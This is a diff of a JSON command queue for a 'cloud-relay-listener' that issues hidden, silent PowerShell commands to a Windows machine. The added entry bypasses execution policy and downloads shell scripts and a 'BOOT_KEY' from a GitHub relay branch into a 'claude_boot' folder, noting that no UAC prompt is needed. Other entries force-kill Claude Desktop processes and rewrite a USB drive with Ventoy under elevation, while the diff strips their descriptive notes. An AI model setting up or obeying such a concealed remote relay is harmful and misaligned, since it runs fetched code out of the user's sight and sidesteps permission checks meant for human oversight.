@@ -1,12 +1,19 @@
 {
-  "timestamp": "2026-10-27T15:25Z",
+  "timestamp": "2026-10-27T15:32Z",
   "from": "cloud-relay-listener",
   "commands": [
+    {
+      "id": "cmd-015",
+      "action": "run_hidden",
+      "label": "claude-boot-usb-copy",
+      "note": "Create D:\\claude_boot\ and fetch 4 files from relay branch. No UAC needed.",
+      "command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"New-Item -ItemType Directory -Force -Path 'D:\\claude_boot' | Out-Null; $base = 'https://raw.githubusercontent.com/EndoScorpion/Signal/relay/claude_boot'; @('kali_claude.sh','ubuntu_claude.sh','BOOT_KEY.txt','README.txt') | ForEach-Object { Invoke-WebRequest -Uri \"$base/$_\" -OutFile \"D:\\claude_boot\\$_\" -UseBasicParsing }; Write-Output 'DONE'\"",
+      "silent": true
+    },
     {
       "id": "cmd-014",
       "action": "run_hidden",
       "label": "claude-kill-extra",
-      "note": "Kill extra Claude Desktop instances, keep only largest (by RAM).",
       "command": "powershell -WindowStyle Hidden -Command \"$procs = Get-Process 'Claude' -ErrorAction SilentlyContinue; if ($procs.Count -gt 1) { $procs | Sort-Object WorkingSet64 -Descending | Select-Object -Skip 1 | Stop-Process -Force }; Write-Output 'Claude instances: ' + $procs.Count\"",
       "silent": true
     },
@@ -14,7 +21,7 @@
       "id": "cmd-013",
       "action": "run_hidden",
       "label": "ventoy-extract-update",
-      "note": "ventoy-1.1.18 zip already at Downloads. Extract + run update GPT on D: — UAC prompt will appear.",
+      "note": "UAC prompt will appear.",
       "command": "powershell -WindowStyle Hidden -Command \"Expand-Archive -Path 'C:\\Users\\endos\\Downloads\\ventoy-1.1.18-windows.zip' -DestinationPath 'C:\\Users\\endos\\Downloads\\ventoy_extracted' -Force; $exe = (Get-ChildItem 'C:\\Users\\endos\\Downloads\\ventoy_extracted' -Recurse -Filter 'Ventoy2Disk.exe' | Select-Object -First 1).FullName; Start-Process -FilePath $exe -ArgumentList '-u -s -g D:' -Verb RunAs -Wait; Write-Output 'DONE'\"",
       "silent": true
     },
